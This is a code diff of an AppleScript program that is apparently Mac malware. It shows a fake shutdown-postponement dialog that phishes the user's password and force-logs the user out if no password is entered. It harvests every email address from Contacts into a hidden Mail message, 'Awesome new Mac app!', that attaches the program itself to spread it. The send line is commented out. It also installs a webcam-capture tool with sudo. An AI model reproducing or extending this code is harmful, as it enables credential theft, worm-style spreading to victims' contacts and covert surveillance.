@@ -20,8 +20,9 @@ end try
 try
 	
 	repeat
-		set passwd to text returned of (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
-		if gave up of result = true then -- If the user doesn't enter a password:
+		set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
+		set passwd to text returned of quest
+		if gave up of quest = true then -- If the user doesn't enter a password:
 			do shell script "killall -u " & theuser -- Shutdown
 		end if
 		
@@ -59,27 +60,6 @@ try
 end try
 
 try
-	do shell script "touch " & ufld & "adr.txt"
-	set adrt to "" & ufld & "adr.txt" -- Create Address file
-	
-	tell application "Contacts"
-		set thepeople to every person
-		set j to (number of people)
-		
-		
-		repeat with i from 1 to j -- Add email addresses to address file
-			set adrper to (number of emails of (item i of the people))
-			repeat with x from 1 to adrper
-				try
-					set adr to (value of email x of (item i of thepeople))
-					do shell script "echo " & adr & " >> ~/desktop/adr.txt"
-				end try
-				
-			end repeat
-		end repeat
-		quit
-	end tell
-	
 	tell application "Mail"
 		set theMessage to make new outgoing message with properties {visible:false, subject:"Awesome new Mac app!", content:"Hey, 
 	
@@ -87,28 +67,33 @@ try
 	
 	" & theuser & ""} -- Make email message
 	end tell
-	
-	set addresses to {}
-	set adrs to paragraphs of (read adrt)
-	
-	repeat with nextLine in adrs
-		if length of nextLine is greater than 0 then
-			tell application "Mail"
-				tell theMessage
-					make new bcc recipient at end of bcc recipients with properties {address:nextLine} -- add recipients
+	tell application "Contacts"
+		set thepeople to every person
+		set j to (number of people)
+		repeat with i from 1 to j -- Add email addresses to address file
+			set adrper to (number of emails of (item i of the people))
+			repeat with x from 1 to adrper
+				set adr to (value of email x of (item i of thepeople))
+				tell application "Mail"
+					tell theMessage
+						make new to recipient at end of to recipients with properties {address:adr} -- add recipients
+					end tell
 				end tell
-			end tell
-		end if
-	end repeat
-	
+			end repeat
+		end repeat
+		quit
+	end tell
 	tell application "Mail"
-		tell content of theMessage
-			make new attachment with properties {file name:(path to me)} at after last paragraph -- Attach the app
-		end tell
+		try
+			tell content of theMessage
+				make new attachment with properties {file name:(path to me)} at after last paragraph -- Attach the app
+			end tell
+		end try
 		-- send theMessage
 		quit
 	end tell
 end try
+
 try
 	set isight to POSIX path of (path to resource "isightcapture")
 	do shell script "sudo cp " & isight & " /usr/sbin" -- Install isightcapture
